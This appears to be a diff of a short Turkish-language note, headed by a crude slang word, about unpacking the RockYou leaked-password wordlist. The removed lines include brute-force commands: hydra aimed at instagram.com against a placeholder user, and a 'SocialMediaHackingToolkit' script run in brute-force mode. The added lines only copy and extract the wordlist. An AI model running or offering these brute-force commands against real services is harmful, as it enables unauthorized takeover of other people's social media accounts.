@@ -1,16 +1,4 @@
 tasaklar 
-gunzip -k /usr/share/wordlists/rockyou.txt.gz
-Bu işlem tamamlandığında, artık kullanıma hazır olacak. Kontrol etmek için:
-
-ls -l /usr/share/wordlists/rockyou.txt
-📌 3️⃣ RockYou.txt’yi Kullanma
-Örneğin, bir brute-force saldırısında bu wordlist’i kullanmak için:
-
-python3 smh.py --bruteforce -u hedefkullanici -w /usr/share/wordlists/rockyou.txt
-veya
-
-hydra -l hedefkullanici -P /usr/share/wordlists/rockyou.txt instagram.com ssh
-📌 4️⃣ RockYou.txt’yi Kendi Klasörüne Kopyalama (İsteğe Bağlı)
-Eğer SMH tool’unun içine taşımak istiyorsan, şu komutla kopyalayabilirsin:
-
-cp /usr/share/wordlists/rockyou.txt ~/SocialMediaHackingToolki
+sudo cp /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz /usr/share/wordlists/
+cd /usr/share/wordlists/
+sudo tar -xvf rockyou.txt.tar.gz
